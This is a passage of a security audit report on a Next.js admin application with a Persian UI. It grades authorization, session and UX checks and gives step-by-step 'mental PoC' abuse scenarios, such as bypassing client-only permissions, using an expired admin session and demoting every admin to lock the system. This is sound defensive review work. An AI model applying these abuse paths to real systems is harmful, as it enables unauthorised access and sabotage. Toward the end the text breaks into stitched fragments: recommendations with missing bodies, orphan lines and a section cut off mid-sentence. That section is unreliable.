      - handleDelete errors → blocking native alert() popup.
  - ⚠️ **Stale error on form close.** Line 133:
      133: <button onClick={() => setShowForm(false)} className="signal-waveform-btn">✕ انصراف</button>
    Clicking "✕ انصراف" closes the form but does NOT clear `error`. If
    the form had an error visible (e.g., "خطا در ذخیره"), closing the
    form returns to the list view, where the SAME error is STILL
    rendered (lines 228-232 are unconditional on `error`). The user
    sees an error message that no longer applies to the current view.
    Severity: LOW (UX confusion).
  - ⚠️ The 401 "unauthorized" error string (English) flows through to
    the Persian UI untranslated (line 48 / 81 — `data.error || ...`
    passes through whatever the server sent). Server returns
    "unauthorized" / "server_error" / "invalid_action" in English
    (route.ts:13, 67, 70, 79, 90). The Persian fallback only kicks in
    if `data.error` is falsy. Cosmetic inconsistency.

----- 10. Successes shown -----
Status: **FAIL** — NO success feedback anywhere

Findings:
  - ❌ **NO success messages, toasts, banners, or alerts anywhere in
    AparatClipManager.tsx.** Grep for "success", "موفق", "با موفقیت",
    "✅", "ذخیره شد", "اضافه شد", "حذف شد" — zero matches in success
    contexts.
  - On successful CREATE: the form closes (line 76), editing is
    cleared (line 77), form is reset (line 78), fetchClips refetches
    (line 79). The user infers success ONLY from the form closing and
    the clip appearing in the refreshed list. No explicit confirmation.
  - On successful UPDATE: same — form closes, list refreshes, no
    confirmation.
  - On successful DELETE: even worse — fetchClips is called regardless
    of success/failure (line 97, per audit item #4), so the user has
    NO way to know whether the delete actually succeeded. The clip
    disappears from the list ONLY if the delete actually worked (since
    fetchClips fetches the live state).
  - The only feedback mechanism in the file is the ERROR banner
    (lines 136-140, 228-232) and the native `alert()` in handleDelete
    (line 99). There is NO success equivalent.

Severity: LOW (UX issue, not a security or correctness bug). The user
must visually verify success by inspecting the list. For deletes, this
is particularly confusing because of audit item #4 — silent failure
with no error message.

================================================================
ADDITIONAL FINDINGS (not in the 10 audit items but observed)
================================================================

----- F-A. Stale error on form close [LOW] -----
Location: AparatClipManager.tsx:133

Code:
  133: <button onClick={() => setShowForm(false)} className="signal-waveform-btn">✕ انصراف</button>

Analysis: clicking "✕ انصراف" closes the form without clearing `error`.
If the form had an error visible, the same error persists in state and
is rendered in the list view (lines 228-232) where it no longer
applies. See audit item #9.

----- F-B. Loading-state flicker on every refetch [LOW, UX] -----
Location: AparatClipManager.tsx:39-55, 79, 97

Analysis: fetchClips sets loading=true on entry (line 40). It's called
on mount (line 36), after create (line 79), after update (line 79),
and after delete (line 97). On each refetch, the entire list view is
replaced by the loading screen (line 122-124) until the fetch
resolves. The list does not update in-place — it disappears and
reappears. After a successful create, the user sees: form closes →
brief loading screen → list. UX jank. A separate `refreshing` state
(or a `silent` flag to fetchClips that skips setLoading(true)) would
fix this.

----- F-C. parseInt partial-garbage acceptance [LOW] -----
Location: AparatClipManager.tsx:196

Code:
  196: onChange={(e) => setForm({ ...form, order: parseInt(e.target.value) || 0 })}

Analysis: `parseInt("12abc")` returns 12, not NaN. The `|| 0` fallback
only catches NaN, so partial-garbage input is silently accepted.
Server also coerces via `Number(body.order) || 0` (route.ts:46, 61),
which has the same behavior. Not a security issue — order is an
integer field with no business meaning beyond sort order.

----- F-D. confirm() and alert() are blocking native calls [LOW, UX] -----
Location: AparatClipManager.tsx:89, 99

Analysis: `confirm("حذف این کلیپ؟")` (line 89) and `alert("خطا در حذف")`
(line 99) are native browser dialogs that block the main thread. They
are visually inconsistent with the rest of the UI (which uses styled
in-page banners). They also can't be styled, themed, or localized
beyond the OS-default. Modern UIs use modal components. Not a security
issue; UX inconsistency. Note that `alert()` is used ONLY in
handleDelete, while fetchClips/handleSubmit use the in-page banner —
this inconsistency is itself a finding (see audit item #9).

----- F-E. No CSRF token [MED, server-side concern] -----
Location: AparatClipManager.tsx:67-86 (handleSubmit), 88-101 (handleDelete)

Analysis: all POST/DELETE calls rely solely on `credentials: "include"`
for authentication. There's no CSRF token in the request body or header.
The server (route.ts:11, 30, 77) calls `checkAdminSession(req)` which
reads the session cookie. Whether this is exploitable depends on:
  (a) Whether the session cookie is set with SameSite=Strict or Lax
      (mitigates cross-origin CSRF).
  (b) Whether the server checks Origin/Referer headers (defense-in-depth).
The CLIENT code is correct (using credentials: "include" is the right
thing for same-origin admin requests). The CSRF mitigation belongs at
the API/cookie-config layer, not the client. Flagged for awareness;
not actionable in this file. Cross-reference: prior audits V17.3-SEC-02
and V17.4-SEC-04 likely cover this at the server level.

================================================================
CRITICAL FINDING (item #4) — detailed reproduction
================================================================
Symptom: deleteClip silently fails server-side; user gets no feedback.
Reproduction:
  1. Admin opens AparatClipManager.
  2. Admin clicks 🗑️ on a clip.
  3. confirm("حذف این کلیپ؟") → OK.
  4. Client sends DELETE /api/admin/clips with {id}.
  5. Server returns 401 (session expired) or 500 (Prisma error) with
     { ok: false, error: "..." }.
  6. Client IGNORES the response body (AparatClipManager.tsx:91-96
     awaits fetch but never reads it).
  7. Client calls fetchClips() unconditionally (line 97).
     - If 401: fetchClips ALSO fails with 401, sets error="unauthorized".
       User sees the clip STILL in the list + an "unauthorized" error.
       They have no idea the delete specifically failed.
     - If 500: fetchClips succeeds, returns the clip (not deleted).
       User sees the clip STILL in the list. No error shown. They
       may click 🗑️ again, repeating the cycle.
  8. Only if fetch() itself throws (network failure, CORS) does
     alert("خطا در حذف") appear (line 99).

Fix-priority advisory (DO NOT APPLY per task instructions):
  - Item #4: assign fetch result to a variable, parse JSON, check
    `data.ok` before calling fetchClips(). Surface non-network
    errors via the in-page error banner (not alert()).
  - Item #10: add a `success` state + success banner / toast.
  - Item #8: add a `submitting` state for handleSubmit; disable the
    submit button while in flight. Add a `deleting` state (or per-clip
    `deletingId`) for handleDelete; disable the 🗑️ button while in
    flight.
  - Item #5: add a `toggleClip(id)` function + a toggle button next
    to the 🟢/🔴 emoji in the list view. Server side: add a "toggle"
    action to POST /api/admin/clips.
  - Item #6: sanitize embedCode at storage time (defense-in-depth),
    in addition to the existing consumer-side sanitizeEmbed().
  - Item #9: clear `error` on "✕ انصراف" (line 133); replace
    alert() in handleDelete with the in-page banner.
  - F-B: pass a `silent` flag to fetchClips that skips setLoading(true)
    for refetches triggered by create/update/delete.

================================================================
Q1. Per-tab permissions enforced server-side?
================================================================
Status: FAIL  | Severity: HIGH

Evidence:
  - The `permissions` field on AccessUser (CSV string) is:
      * WRITTEN by admin: src/app/api/admin/users/route.ts:79,115
        (POST creates user with permissions); [id]/route.ts:56
        (PUT updates permissions).
      * READ back to client at src/app/api/user/verify/route.ts:40
        (`permissions: user.permissions`).
  - It is consumed ONLY client-side at
        src/app/user-dashboard/page.tsx:134-143
      133:  const isAdmin = user.role === "admin";
      134:  const userPermissions = user.permissions
      135:    ? user.permissions.split(",").filter(Boolean)
      136:    : [];
      138:  function hasTabAccess(tabId: Tab): boolean {
      139:    if (isAdmin) return true;
      140:    if (tabId === "overview") return true;
      141:    if (tabId === "settings") return true;
      142:    return userPermissions.includes(tabId);   // ← client only
      143:  }
  - Server-side search confirms NO API route reads `user.permissions`
    to gate a per-tab resource:
      `Grep user.permissions /role === "admin" src/app/api` → only
      matches in admin/users/* (writing the field) and user/verify
      (returning the field). No content/messages/clips/text/nav/themes
      route consults `permissions`.
  - The actual content endpoints either:
      (a) require admin role (e.g. /api/messages at
          src/app/api/messages/route.ts:14 calls checkAdminAuth,
          which requires role === "admin" at
          src/lib/admin-auth.ts:25) — so a non-admin user with the
          "messages" permission CANNOT fetch /api/messages at all,
          OR
      (b) are public (e.g. /api/content, /api/clips listed in
          PUBLIC_API_PREFIXES at src/middleware.ts:24-37) — so the
          "content" / "clips" permission gates nothing.
  - Net effect: the per-tab permission matrix is COSMETIC. A user
    with `permissions = "messages"` can see the Messages tab in
    the dashboard UI, but the tab cannot load any data (because
    /api/messages returns 401 for non-admins), and a user with
    NO permissions can still call every public content endpoint.

PoC (mental — no code executed):
  1. Admin creates user U with role=user, permissions="messages".
  2. U logs in, opens dashboard, sees "Messages" tab.
  3. U's browser calls GET /api/messages.
  4. /api/messages/route.ts:14 calls checkAdminAuth(req).
  5. admin-auth.ts:25 rejects because U.role !== "admin" → 401.
  6. The tab is broken for U.
  Reverse:
  1. Admin creates user U with role=user, permissions=null.
  2. U's browser hides Messages tab.
  3. U manually edits the dashboard JS (or calls fetch directly):
        fetch('/api/content', {credentials:'include'})
     — succeeds because /api/content is in PUBLIC_API_PREFIXES.
  → The "permission" boundary is client-only and trivially bypassed
  for the public endpoints; non-functional for the admin endpoints.

Cross-reference: similar client-only RBAC gap noted in V17.4-SEC-12
  Q5 (chat content stored raw) — server-side enforcement is the
  only reliable boundary.

================================================================
Q2. Time-based access enforced server-side?
================================================================
Status: FAIL  | Severity: HIGH

Evidence:
  - `checkAccess(userId)` at src/lib/access-auth.ts:111-150 DOES
    implement hour/day/time-window logic correctly:
      114:  if (!user.active) return { allowed: false, reason: ... };
      118-120: expiry check
      122-129: allowedDays check (uses now.getUTCDay())
      132-147: allowedHourStart/End check (handles wrap-around)
  - BUT it is invoked from EXACTLY ONE call site:
      src/app/api/user/verify/route.ts:27
        const access = await checkAccess(user.id);
      That endpoint returns the result as JSON (route.ts:48):
        return NextResponse.json({ ok: true, user: {...}, access });
      It does NOT 401 the request. It does NOT revoke the session.
      It does NOT block subsequent API calls. The decision is
      shipped to the client, which is free to ignore
      `access.allowed === false`.
  - No other API route calls `checkAccess`. In particular:
      * /api/messages               — only checkAdminAuth
      * /api/admin/*                — only checkAdmin/checkAdminAuth/
                                      checkAdminSession (role check,
                                      not time check)
      * /api/admin/users/*          — same
      * /api/admin/clips            — same
      * /api/admin/content          — same
      * /api/admin/text             — same
      * /api/admin/nav              — same
      * /api/admin/themes           — same
  - The middleware (src/middleware.ts:138-215) only checks
    session-cookie SHAPE (hasValidSession, line 70-93) — it
    explicitly does NOT verify HMAC (comment at line 87-88)
    and does NOT consult allowedHourStart/allowedDays/expiresAt.
  - An admin who happens to have a time restriction set on
    their own account can still call /api/admin/* at any time,
    because the admin check at admin-auth.ts:17-31 only verifies
    role === "admin" and user.active — it never calls checkAccess.
  - The login route (src/app/api/user/login/route.ts:82-92)
    blocks login for inactive / expired accounts, but does NOT
    check hours or days at login time. A user can log in at 03:00
    outside their allowed window — login succeeds (route.ts:94-103
    sets the cookie), then the dashboard shows the "access
    restricted" warning but the session is live for 24h.

PoC (mental):
  1. Admin sets user U with allowedHourStart=9, allowedHourEnd=17.
  2. U logs in at 03:00. Login succeeds (no hour check at login).
  3. U's cookie is valid for 24h.
  4. U opens dashboard. /api/user/verify returns
        { ok: true, access: { allowed: false, reason: "access_denied_off_hours" } }.
  5. U's browser SHOULD show a warning and block tabs — but the
     client code at user-dashboard/page.tsx does NOT actually
     enforce access.allowed. It only displays the warning text
     (line 145+ uses accessSchedule for display, doesn't gate on
     access.allowed). And any direct fetch() to /api/* bypasses
     the client warning entirely.

Cross-reference: prior audit V17.4-SEC-12 Q3 (chat history
  unbounded) similarly notes that server-side resource caps are
  the only reliable boundary; client-side "access" flags are
  advisory only.

================================================================
Q3. Expiry enforced server-side?
================================================================
Status: PARTIAL  | Severity: HIGH

Evidence:
  - LOGIN-TIME enforcement: src/app/api/user/login/route.ts:88-92
        if (user.expiresAt && new Date() > user.expiresAt) {
          await logAccess(user.id, "access_denied_expired", ...);
          return NextResponse.json(
            { ok: false, error: "account_expired" }, { status: 403 });
        }
    ✅ Correct: an expired account cannot log in.
  - RUNTIME enforcement via checkAccess (access-auth.ts:118-120):
        if (user.expiresAt && now > user.expiresAt) {
          return { allowed: false, reason: "access_denied_expired" };
        }
    ✅ Logic correct.
  - BUT, as shown in Q2, `checkAccess` is called ONLY at
    /api/user/verify — and that endpoint returns ok:true regardless
    of access.allowed (it just ships the flag to the client).
  - The middleware does NOT consult user.expiresAt. Middleware's
    `hasValidSession` (src/middleware.ts:70-93) only checks the
    cookie's own embedded `expiresAt` (the 24h session-token
    expiry at access-auth.ts:68), NOT the user's `expiresAt` DB
    column.
  - The admin API gatekeepers (`checkAdmin`, `checkAdminAuth`,
    `checkAdminSession`) check `user.active` and `user.role ===
    "admin"` but DO NOT consult `user.expiresAt`:
      src/app/api/admin/users/route.ts:21-28 (checkAdmin):
        21:  const session = getSessionFromRequest(request);
        22:  if (!session) return null;
        23:  const user = await db.accessUser.findUnique(...);
        24:  if (!user || !user.active) return null;     // ← only active
        25:  if (user.role !== "admin") return null;     // ← only role
        26:  return user;
    No `user.expiresAt` check.
  - Net effect: an admin whose account expires at 2026-09-30
    23:59 UTC can still log in any time before that, and after
    login their 24h session token remains valid until either:
      (a) the cookie's own 24h expiry (access-auth.ts:68,
          SESSION_DURATION_HOURS = 24), or
      (b) the user is manually deactivated by another admin.
    The DB `expiresAt` column is never re-checked at request time
    on /api/admin/* — only at /api/user/verify, and only as an
    advisory flag.

PoC (mental):
  1. Admin sets user U with expiresAt = 2026-09-30T23:59:00Z.
  2. U logs in at 2026-09-30T22:00:00Z. Login succeeds.
  3. U waits 2 hours. It's now 2026-10-01T00:00:00Z — U is expired.
  4. U's browser hits /api/user/verify → returns access.allowed=false
     but ok:true. The cookie is still valid (session token expiry
     is 2026-10-01T22:00:00Z).
  5. U bypasses the client warning and calls any admin endpoint
     they have admin role on — succeeds, because checkAdmin at
     admin-auth.ts:17-31 only checks `user.active` (still true) and
     `role === "admin"` (still true). It does NOT check
     `user.expiresAt`.

Cross-reference: V17.4-FINAL fixed bot-token masking but did not
  address session-token vs. user-expiry gap. This is a NEW finding
  for this audit.

================================================================
Q4. Can non-admin access /api/admin/*?
================================================================
Status: PASS  | Severity: —

Evidence:
  - Middleware (src/middleware.ts:188-193) blocks ANY request to
    /api/admin/* without a session cookie (returns 401
    "unauthorized"). The middleware check is SHAPE-ONLY —
    hasValidSession at middleware.ts:70-93 does NOT verify the
    HMAC signature (comment at line 87-88 explicitly admits this).
    A forged-cookie-shape attacker can pass middleware.
  - HOWEVER, every /api/admin/* endpoint re-checks the session
    at the API layer via `checkAdminAuth` (admin-auth.ts:17-31),
    `checkAdminSession` (admin-session.ts:11-24), or a local
    `checkAdmin` helper (admin/users/route.ts:21-28,
    admin/users/[id]/route.ts:15-22, admin/users/logs/route.ts:12-19).
  - All three call `getSessionFromRequest` (access-auth.ts:186-201)
    → `verifySessionToken` (access-auth.ts:78-96), which verifies
    the HMAC signature using `crypto.timingSafeEqual` (line 91).
    A forged cookie fails the signature check → returns null →
    API returns 401.
  - All three also verify `user.active` AND `user.role === "admin"`.
  - For /api/messages specifically (NOT under /api/admin/ prefix
    but still session-gated by middleware line 188):
    src/app/api/messages/route.ts:14,66 calls checkAdminAuth,
    which enforces role === "admin". A non-admin user's session
    is rejected → 401.

Conclusion: non-admin users (and unauthenticated users) CANNOT
access /api/admin/* — even with a forged-shape cookie, because
the API-layer HMAC verification rejects them. ✅

Caveat: per Q3, an EX-admin (still active, still role=admin, but
whose `expiresAt` has passed) CAN still access /api/admin/* for
up to 24h after expiry. That's not strictly "non-admin" access
but it's a related gap.

================================================================
Q5. passwordHash excluded?
================================================================
Status: PASS  | Severity: —

Evidence:
  - GET /api/admin/users — uses Prisma `select` clause that
    enumerates every field EXCEPT passwordHash:
      src/app/api/admin/users/route.ts:38-58:
        40:  select: {
        41:    id: true, username: true, displayName: true, role: true,
        45:    allowedHourStart: true, allowedHourEnd: true,
        47:    allowedDays: true, permissions: true, expiresAt: true,
        49:    active: true, loginCount: true, lastLoginAt: true,
        51:    deactivatedReason: true, createdAt: true, updatedAt: true,
        56:    // passwordHash هرگز برگردانده نمی‌شه
        57:  }
    ✅
  - POST /api/admin/users — uses `select` on the create() return:
      src/app/api/admin/users/route.ts:119-131 — same field list,
      no passwordHash.
    ✅
  - PUT /api/admin/users/[id] — uses `select` on update() return:
      src/app/api/admin/users/[id]/route.ts:79-91 — no passwordHash.
    ✅
  - GET /api/admin/users/logs — uses `include: { user: { select:
    { username: true, displayName: true } } }` at logs/route.ts:38-42
    — does not include passwordHash.
    ✅
  - GET /api/user/verify — returns hand-built user object at
    verify/route.ts:35-48 — no passwordHash.
    ✅
  - POST /api/user/login — returns only
    { username, displayName, role } at login/route.ts:107-111.
    ✅
  - The Prisma schema's default behavior would return all fields
    if `findUnique` is called WITHOUT a select — but every read
    path here uses an explicit `select` that excludes passwordHash.
    ✅

Conclusion: passwordHash is excluded from every response surface.
✅

================================================================
Q6. Admin can create admin?
================================================================
Status: PASS-by-design  | Severity: LOW (informational)

Evidence:
  - POST /api/admin/users (route.ts:65-135) accepts `role` in body.
  - route.ts:75: `const role: string = body.role === "admin" ? "admin" : "user";`
  - No further check on whether the acting admin is "super-admin" or
    whether escalation is permitted. ANY admin can create a new admin.
  - The client UI (AccessUserManager.tsx:325-333) exposes a Role
    dropdown with the "admin" option:
      326:    <select value={form.role} onChange={...}>
      330:      <option value="user">user (عادی)</option>
      331:      <option value="admin">admin (ادمین — دسترسی کامل)</option>
      332:    </select>
  - This is a SINGLE-TIER admin model. There is no concept of
    "owner" or "super-admin" who is the only one permitted to
    promote other users to admin.

Conclusion: yes, any admin can create another admin. This appears
to be by design (no escalation control layer exists), but the
absence of any restriction should be noted because it
amplifies the impact of Q7 + Q9 (an admin can be created, then
demote every other admin including themselves, bricking the
system). Combined with the absence of audit logging for this
action (Q10), a rogue admin can create a second admin account
without any trace.

Cross-reference: Q9 (no last-admin protection) + Q10 (no audit
  log for user creation) together make this a stealth-escalation
  surface.

================================================================
Q7. Admin can demote self?
================================================================
Status: FAIL  | Severity: HIGH

Evidence:
  - PUT /api/admin/users/[id] allows setting `role`:
      src/app/api/admin/users/[id]/route.ts:48:
        if (body.role !== undefined)
          data.role = body.role === "admin" ? "admin" : "user";
  - The ONLY self-protection in this route is for `active=false`:
      route.ts:72-74:
        if (id === admin.id && data.active === false) {
          return NextResponse.json(
            { ok: false, error: "cannot_deactivate_self" },
            { status: 400 });
        }
  - There is NO equivalent guard against `id === admin.id && data.role === "user"`.
  - The client UI (AccessUserManager.tsx:325-333) lets the admin
    open their own row for editing (startEdit at line 115) and
    pick "user" in the Role dropdown. No client-side guard either.
  - If an admin demotes themselves, the immediate next API call
    they make (e.g. fetchUsers to refresh the table) returns 401,
    because checkAdmin at route.ts:21-28 requires role === "admin".
  - If they are the ONLY admin, the system now has zero admins
    and is unrecoverable except via direct DB intervention (or
    the reset-admin-password.sh script that bypasses the API).

PoC (mental):
  1. Admin A opens their own row in AccessUserManager.
  2. A picks role=user, clicks "ذخیره تغییرات".
  3. PUT /api/admin/users/A with body.role="user".
  4. Server: existing check (route.ts:72) only blocks
     data.active === false. data.role is allowed.
  5. db.accessUser.update sets A.role = "user".
  6. Server returns updated user. Client refetches /api/admin/users.
  7. checkAdmin rejects A (role !== "admin") → 401.
  8. If A was the only admin: system has zero admins.
     No way to recover via the UI.

Conclusion: admin can demote self. No guard exists. ✗

================================================================
Q8. Admin can delete self?
================================================================
Status: PASS  | Severity: —

Evidence:
  - DELETE /api/admin/users/[id] explicitly blocks self-deletion:
      src/app/api/admin/users/[id]/route.ts:111-114:
        // جلوگیری از حذف خود
        if (id === admin.id) {
          return NextResponse.json(
            { ok: false, error: "cannot_delete_self" },
            { status: 400 });
        }
  - This check happens BEFORE the existence check at line 117,
    so even if the ID is the admin's own ID, the 400 fires first.
  - The client UI maps the error at AccessUserManager.tsx:208-214
    to a localized alert. ✅
  - No bypass path found: the only DELETE handler is at this route.

Conclusion: admin cannot delete self. ✅

================================================================
Q9. Admin can delete last admin?
================================================================
Status: FAIL  | Severity: HIGH

Evidence:
  - DELETE handler at src/app/api/admin/users/[id]/route.ts:100-126:
    The guards are:
      104:  const admin = await checkAdmin(request);  (caller is admin)
      112:  if (id === admin.id) → cannot_delete_self
      117:  const existing = await db.accessUser.findUnique(...)
      123:  await db.accessUser.delete({ where: { id } });
    There is NO check of the form:
      const adminCount = await db.accessUser.count(
        { where: { role: "admin", active: true } });
      if (existing.role === "admin" && adminCount <= 1) {
        return NextResponse.json(
          { ok: false, error: "cannot_delete_last_admin" }, ...);
      }
  - PUT handler at src/app/api/admin/users/[id]/route.ts:27-95:
    The guards are:
      31:  const admin = await checkAdmin(request);
      40:  existing user must exist
      72:  if (id === admin.id && data.active === false)
            → cannot_deactivate_self
    There is NO check preventing:
      (a) demotion of a DIFFERENT admin to user (data.role = "user"
          on a target whose role was "admin") — even if that
          target is the only other admin.
      (b) deactivation (active=false) of a DIFFERENT admin who
          is the last admin (the cannot_deactivate_self guard
          only fires when id === admin.id; it does NOT fire for
          other admin IDs).
  - Combined with Q7 (admin can demote self), an admin can:
      1. Demote every OTHER admin to user (no guard).
      2. Then demote themselves (no guard per Q7).
      → System has zero admins.
  - Or simpler:
      1. Admin A is the only admin.
      2. Admin A opens their own row, sets role=user, saves.
      3. Done — no admins left.

PoC (mental):
  Variant A — delete the last other admin:
    1. Admin A and Admin B exist. A wants to brick the system.
    2. A calls DELETE /api/admin/users/B.
    3. Server: checkAdmin → A is admin. id (B) !== admin.id (A) →
       passes the self-delete guard. existing = B. delete B.
    4. Now A is the only admin.
    5. A calls PUT /api/admin/users/A with { role: "user" }.
    6. Server: checkAdmin → A is still admin (request was issued
       before the role change is committed). The self-deactivate
       guard doesn't fire because data.active is not false.
       data.role = "user" is committed.
    7. Next request from A: 401. System has zero admins.
  Variant B — demote the only other admin via PUT:
    1. Admin A and Admin B exist.
    2. A calls PUT /api/admin/users/B with { role: "user" }.
    3. No guard. B is demoted. A is now the only admin.
    4. A demotes self per Q7. System has zero admins.

Conclusion: there is NO last-admin protection. ✗

Cross-reference: Q6 (any admin can create admin) means this
  attack can be stealthily set up — a rogue admin creates a
  throwaway second admin, then uses it to demote the legitimate
  one, leaving the rogue as the sole admin (or, if sloppy,
  bricking the system). Combined with Q10 (no audit log),
  the attack leaves no trace in the AccessLog table.

================================================================
Q10. User mutations audit-logged?
================================================================
Status: FAIL  | Severity: MED

Evidence:
  - `logAccess` (access-auth.ts:155-170) writes to the AccessLog
    table.
  - Call sites found via `Grep logAccess src/app/api`:
      src/app/api/admin/security/route.ts:81,96  (password_change_failed,
                                                 password_changed)
      src/app/api/user/login/route.ts:78,84,90,103 (login_failed,
                                                    access_denied_inactive,
                                                    access_denied_expired,
                                                    login_success)
      src/app/api/user/verify/route.ts:30 (access.reason — denied access
                                            at verify time)
  - NOT called from:
      * src/app/api/admin/users/route.ts POST (create user)
        — line 65-135, no logAccess call. The CREATE event is
          invisible in the audit log.
      * src/app/api/admin/users/[id]/route.ts PUT (edit user)
        — line 27-95, no logAccess call. Role changes, permission
          changes, password resets, expiry changes, deactivations
          — ALL invisible in the audit log.
      * src/app/api/admin/users/[id]/route.ts DELETE (delete user)
        — line 100-126, no logAccess call. The DELETE event is
          invisible in the audit log. Worse: because AccessLog
          rows are FK-linked to AccessUser with onDelete: Cascade
          (per the comment at line 122 of the same file —
          "AccessLog ها به‌خاطر onDelete: Cascade خودکار حذف می‌شن"),
          deleting a user ALSO deletes all of their historical
          audit-log entries. The audit trail is destroyed as part
          of the user-deletion operation.
  - The admin /api/admin/users/logs endpoint (logs/route.ts) will
    therefore only ever show login/logout/access-denied events
    and password-change events. It will NEVER show:
      * "user X created user Y with role=admin"
      * "user X demoted user Y from admin to user"
      * "user X deactivated user Y"
      * "user X deleted user Y (and erased Y's audit history)"
  - This is particularly dangerous combined with Q6+Q7+Q9: an
    admin can perform privilege-granting, privilege-revoking, and
    user-deletion operations with zero forensic trail.

Conclusion: user mutations are NOT audit-logged. The deletion
operation additionally DESTROYS audit history via cascade. ✗

Cross-reference: V17.4-SEC-12 Q10 noted that visitorId was
  forgeable; this audit identifies a separate audit-trail gap
  on the admin side. V17.4-FINAL did not address audit logging
  of admin mutations.

================================================================
ADDITIONAL FINDINGS (not in the 10 questions but observed)
================================================================

----- F-A. Middleware HMAC bypass (known, deferred)  [MED] -----
Location: src/middleware.ts:70-93

  - hasValidSession decodes the base64 token, splits into 3
    parts, parses expiresAt, and returns true if userId.length
    > 0. It does NOT verify the HMAC signature.
  - The comment at line 87-88 admits this:
      "در middleware نمی‌تونیم HMAC رو verify کنیم چون SESSION_SECRET
       بهش دسترسی نداریم"
    ("We can't verify HMAC in middleware because we don't have
    access to SESSION_SECRET.")
  - Mitigation in place: every /api/admin/* route re-verifies
    the HMAC at the API layer (Q4 PASS). So middleware bypass
    alone does NOT yield access.
  - HOWEVER, /api/messages is gated ONLY by middleware + a
    subsequent checkAdminAuth (which DOES verify HMAC). So
    the middleware bypass is not exploitable on its own.
  - The risk is defense-in-depth: if any future admin route
    is added that relies ONLY on middleware (forgets to call
    checkAdminAuth), the middleware bypass becomes a direct
    privilege-escalation bug. The current pattern is fragile.

Cross-reference: V17.3-SEC-02 Q3/F-1 (middleware session
  validation is format-only). Still open.

----- F-B. /api/user/verify returns ok:true even when access
       is denied  [LOW, design smell]  -----
Location: src/app/api/user/verify/route.ts:28-49

  - When `access.allowed === false`, the endpoint still returns
    HTTP 200 with `{ ok: true, user: {...}, access: {allowed:false,
    reason:"access_denied_off_hours"} }`.
  - This is documented behavior (file header comment lines 4-9),
    but it means a misbehaving client can simply ignore the
    `access` field and use the returned `user` object as if
    access were granted. The session cookie is NOT invalidated,
    and the user object is NOT redacted.
  - Should at minimum: redact the `user` object (or omit
    sensitive fields like `permissions`) when access.allowed
    is false, OR return 403 to make the denial enforceable.

----- F-C. PUT body.role accepts any truthy value  [LOW]  -----
Location: src/app/api/admin/users/[id]/route.ts:48

  - `data.role = body.role === "admin" ? "admin" : "user";`
  - The expression coerces anything that isn't the string
    "admin" (including `1`, `true`, `"ADMIN"`, `"Administrator"`)
    to "user". Not a security bug per se, but means an admin
    who sends `{ role: true }` expecting admin gets user
    silently. Strict equality would catch typos at the API
    boundary.

----- F-D. No input validation on allowedDays string  [LOW]  -----
Location: src/app/api/admin/users/route.ts:78;
         src/app/api/admin/users/[id]/route.ts:55

  - allowedDays is stored as-is (`body.allowedDays || null`).
  - No format check (could be "1,2,3,banana,99,-5,5.5").
  - The parser in access-auth.ts:125 (`.split(",").map(d =>
    parseInt(d.trim(), 10)).filter(n => !isNaN(n))`) tolerates
    garbage, but the DB column accepts any string. An admin
    (or attacker who has compromised an admin) can store
    arbitrary content in allowedDays — minor data-hygiene gap.

----- F-E. expiresAt accepts any Date.parse-able string  [LOW]  -----
Location: src/app/api/admin/users/route.ts:80;
         src/app/api/admin/users/[id]/route.ts:58

  - `const expiresAt = body.expiresAt ? new Date(body.expiresAt) : null;`
  - `new Date("invalid")` produces an Invalid Date object, which
    Prisma may reject (depending on driver) or may store as NULL
    / epoch. Either way, the admin UI sends a valid ISO date
    (AccessUserManager.tsx:162), so this is only a server-side
    hardening gap if the API is called directly without the UI.

================================================================

3. Q2 — Re-check allowedHourStart/allowedHourEnd/allowedDays at

4. Q1 — Either:

5. Q10 — Add logAccess calls to:

   - PUT  /api/admin/users/[id]     → action="user_updated",
     details=`fields=role,active,expiresAt,...` (omit PII like

   - DELETE /api/admin/users/[id]   → action="user_deleted",
     details=`username=${existing.username}`

   FK from onDelete: Cascade to onDelete: SetNull (or soft-
   delete the user instead of hard-delete), so deletion of a
   user does not erase their audit history. [MED]

   HMAC check in a shared module that runs at request time).
   This is a defense-in-depth improvement. [MED]

7. F-B — In /api/user/verify, when access.allowed === false,
   return HTTP 403 (or at minimum redact the user object).

  4 PASS (Q4, Q5, Q8, Q6-by-design)

  The user-management subsystem has solid authentication
  (HMAC-signed session tokens, bcrypt password hashing,
  httpOnly+sameSite=strict cookies, rate-limited login) and
  correctly excludes passwordHash from every response.
  Non-admin users are reliably blocked from /api/admin/*.

  However, the AUTHORIZATION layer has four HIGH gaps:
    Q1 — per-tab permissions are client-only (cosmetic).
    Q2 — time-based access is advisory only (verify endpoint
         returns ok:true with access.allowed=false; no API
         route re-checks hours/days).
    Q7 — admin can demote self (no guard analogous to the
         cannot_deactivate_self guard).
    Q9 — no last-admin protection (an admin can delete or
         demote every admin, bricking the system).
  And one MED gap:
    Q10 — user mutations (create/update/delete) are NOT
         audit-logged, and DELETE cascade-erases the target's
         audit history.

  Recommended next action: address Q9+Q7 first (last-admin
  guard + self-demotion guard), as these can permanently lock
  the system. Then Q3+Q2 (server-side re-check of expiry and
  time-window at every admin API call). Then Q10 (audit log).
  Q1 is a product-decision (drop the feature or implement it
  properly server-side).

Q1. Logout invalidates server-side?
================================================================
Status: FAIL  | Severity: HIGH
Location: src/app/api/user/logout/route.ts:7-11
          src/lib/access-auth.ts:78-96 (verifySessionToken — no revoke check)

Code:
  logout/route.ts:7-11:
    export async function POST() {
      const response = NextResponse.json({ ok: true });
      response.cookies.delete("access_session");
      return response;
    }

Analysis:
  - The entire logout implementation is `response.cookies.delete("access_session")`.
  - That ONLY instructs the browser to delete its local cookie. It does NOTHING
    on the server:
      * No DB write.
      * No `tokenVersion` increment.
      * No insertion into a session denylist.
      * No `AccessLog` row with action="logout" (despite AccessLog schema
        declaring "logout" as a valid action value — schema.prisma:424 —
        the logout endpoint never calls logAccess; cf. login/route.ts:103
        which DOES call logAccess for "login_success").
  - The cookie value itself is still cryptographically valid: verifySessionToken
    (access-auth.ts:78-96) will still return { userId, expiresAt } for any
    captured copy of the cookie until its natural 24h expiry (access-auth.ts:44).
  - Therefore: a stolen / leaked / pre-captured cookie remains 100% usable
    for up to 24h AFTER the victim clicked "Logout". Logout is purely
    cosmetic from a server-side-security standpoint.
  - Cross-reference: AccessUserManager.tsx:575 (the only place "logout"
    appears in the admin UI is as a color-style for an AccessLog action
    string — there is NO logout-button code that calls this endpoint
    with any session-revoking semantics).

Analysis:
  - Deactivation IS effective AT THE API LAYER on every subsequent request,
    because every protected handler re-reads the user row and rejects when

    consult the DB either — it only verifies cookie shape + expiry.
    Therefore at the EDGE LAYER:
